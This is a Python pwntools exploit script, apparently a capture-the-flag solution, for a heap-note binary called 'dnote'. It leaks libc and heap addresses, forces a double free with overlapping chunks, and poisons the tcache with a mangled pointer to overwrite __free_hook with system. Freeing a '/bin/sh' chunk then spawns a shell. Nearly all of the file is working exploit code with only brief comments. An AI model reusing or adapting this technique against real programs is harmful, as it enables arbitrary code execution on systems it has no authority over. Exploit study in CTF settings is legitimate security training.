#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./dnote_patched", checksec=False)
libc = elf.libc


def start(argv=[], *a, **kw):
    nc = "nc localhost 1337"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


def alloc(idx, sz, data):
    io.sendlineafter(b">> ", b"1")
    io.sendlineafter(b"no : ", str(idx).encode())
    io.sendlineafter(b"size : ", str(sz).encode())
    io.sendlineafter(b"Name : ", data)


def free(idx):
    io.sendlineafter(b">> ", b"3")
    io.sendlineafter(b"no : ", str(idx).encode())


def show(idx):
    io.sendlineafter(b">> ", b"2")
    io.sendlineafter(b"no : ", str(idx).encode())
    return io.recvline(keepends=False)


def mangle(pos, ptr):
    return (pos >> 12) ^ ptr


env = {}
io = start()

alloc(0, 0x410, b"A")
alloc(1, 0x10, b"A")

# populate unsorted bin
free(0)

"""
request a chunk whose size is larger than the free chunk available in unsorted
bin such that the unsorted bin is sorted and our 0x500 chunk is moved into the
large bin
"""
alloc(2, 0x420, b"A")

libc_leak = u64(show(0).ljust(8, b"\x00"))
libc.address = libc_leak - 0x1c4ff0
log.info(f"{libc.address=:#x}")

free(1)
heap_leak = u64(show(1).ljust(8, b"\x00"))
heap_base = heap_leak << 12
log.info(f"{heap_base=:#x}")
alloc(1, 0x10, b"A")

alloc(0, 0x410, b"A")

for i in range(7):
    alloc(19 - 6 + i, 0x100, b"A")

prev = 6
victim = 7
alloc(prev, 0x100, b"prev")
alloc(victim, 0x100, b"victim")
alloc(8, 0x10, b"pad")

# fill up tcachebins
for i in range(7):
    free(19 - 6 + i)

# add victim and prev into unsorted bin and consolidate
free(victim)
free(prev)

# free up 1 space from tcachebins
alloc(9, 0x100, b"B")

# double free, add victim into tcachebins
free(victim)

# overlaps prev chunk and victim metadata
# and overwrite victim's fd
alloc(prev, 0x120, b"C" * 0x100 + flat(0, 0x111) +
      p64(mangle(heap_base + 0x1000, libc.symbols["__free_hook"])))

alloc(victim, 0x100, b"/bin/sh\x00")
alloc(10, 0x100, p64(libc.symbols["system"]))

free(victim)

io.interactive()
